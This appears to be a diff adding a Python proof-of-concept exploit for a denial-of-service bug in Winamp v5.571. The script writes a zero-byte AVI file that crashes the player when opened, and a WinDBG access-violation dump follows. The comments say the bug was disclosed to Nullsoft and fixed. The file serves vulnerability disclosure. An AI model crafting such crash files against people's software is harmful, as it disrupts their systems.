@@ -1,0 +1,38 @@
+# Tested on Windows 7 and Winamp v5.571(x86)
+# This bug is informed to Nullsoft and was fixed long back.
+# The status can be found at http://forums.winamp.com/showthread.php?s=&threadid=316000 
+# This code works on Python 3.0. To make it work on <3.0 remove braces in print
+
+print("\n***Winamp v5.571 malicious AVI file handling DoS Vulnerability***\n")
+
+try:
+        open('winampcrash.avi', 'w')
+        print ("Creating malicious AVI file . . . \n")
+        print ("Successfully created Zero size AVI file\n")
+        print ("Open created Zero size AVI file in Winamp.....Boom\n\n")
+except IOError:                     
+        print ("Unable to create Zero size AVI file\n")
+        
+
+
+
+
+"""
+Following is the WinDBG status when we open winampcrash.AVI file in Winamp v5.571(x86)
+
+(f00.e60): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=0886fe68 edi=02880618
+eip=076243f1 esp=0886fc50 ebp=0886ff28 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+in_AVI!winampGetInModule2+0x13da:
+076243f1 8b4008          mov     eax,dword ptr [eax+8] ds:002b:00000008=????????
+
+
+"""
+
+
+#Best Regards,
+#Praveen Darshanam
+
